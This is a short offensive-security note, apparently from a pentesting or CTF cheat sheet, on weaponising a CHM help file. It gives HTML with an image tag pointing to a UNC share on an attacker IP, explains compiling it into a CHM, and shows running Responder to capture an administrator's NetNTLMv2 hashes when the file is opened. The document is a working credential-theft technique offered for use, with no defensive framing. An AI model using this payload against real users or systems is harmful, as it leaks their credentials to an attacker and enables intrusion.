# CHM



### Malicious CHM

A CHM file is a compiled HTML file that is used for "Help Documentation".

In order to exploit this, we can create a new CHM file containing a UNC link, that will trigger a connection to our server on opening. This will allow us to steal the admin's NetNTLMv2 hashes. Consider the following HTML code.

```markup
<html>
    <body>
        <img src=\\10.10.14.23\share\abc.png />
    </body>
</html>
```

We will place the above code into instructions.html, and use the [HTML Help Workshop](http://www.helpgenerator.com/html\_help\_workshop.htm) on a Windows machine to compile the code. Download and install `htmlhelp.exe` .

Listen with responder on our localhost:

```
python Responder.py -I tun0
```

Wait for an admin to access the file and get the hash.
